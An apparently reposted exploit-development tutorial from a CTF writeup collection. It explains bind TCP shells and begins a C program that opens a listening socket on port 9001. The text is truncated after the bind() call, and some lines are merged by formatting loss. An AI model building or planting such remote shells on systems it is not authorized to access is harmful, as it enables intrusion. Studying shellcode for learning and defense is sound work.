# :skull: [ExpDev] Bind TCP Shellcode

> **Original Source:** [[ExpDev] Bind TCP Shellcode](https://infosecwriteups.com/expdev-bind-tcp-shellcode-cebb5657a997)
> **Platform:** infosecwriteups.com | **Category:** `PWN`

---

# [ExpDev] Bind TCP Shellcode


## What is a Bind Shell?


Bind TCP opens up a port on the victim system. If an attacker could exploit a vulnerability on the victim system, she can implant a bind shell and connect to it from the remote attacking box. However, due to a firewall and detection controls, reverse TCP shell is preferable over bind TCP shell these days.

## Socket Programming


Before creating our Bind TCP Shell in shellcode, we need to understand the Socket Programming.

>

Note: Socket programming is a way of connecting two nodes on a network to communicate with each other.


To better understand the Bind TCP, let’s create a Bind TCP Shell in a higher programming language. We will use `C`:


```
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>int main()
{
int sockfd, acceptfd;
int port = 9001; // Server Address struct
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = INADDR_ANY;  // 1) Socket Creation (sys_socket 1)
sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Bind() Syscall (sys_bind 2)
bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
```

---

*Originally published on [Medium](https://infosecwriteups.com/expdev-bind-tcp-shellcode-cebb5657a997). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of pwn CTF writeups.*
